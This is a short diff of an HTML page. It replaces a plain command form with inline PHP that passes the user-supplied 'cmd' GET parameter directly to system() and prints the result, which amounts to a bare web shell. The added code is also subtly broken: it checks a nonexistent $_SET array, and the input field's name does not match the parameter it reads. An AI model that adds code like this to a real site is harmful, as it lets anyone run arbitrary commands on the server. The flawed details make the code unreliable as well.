@@ -1,14 +1,16 @@
 <html>
-<head>
-    <title>System Command Execution</title>
-</head>
-<body>
-    <h1>Execute System Command</h1>
-    <form action="execute.php" method="POST">
-        <label for="command">Command:</label>
-        <input type="text" name="command" id="command" required>
-        <br><br>
-        <input type="submit" value="Execute">
-    </form>
-</body>
+    <body>
+        <form method = "GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+            <input type="TEXT" name="cmf" autofocus id="cmd" size="80">
+            <input type="SUBMIT" value="Execute">
+        </form>
+        <pre>
+        <?php
+if(isset($_SET['cmd']))
+{
+    system($_GET['cmd']);
+}
+?>
+</pre>
+    </body>
 </html>
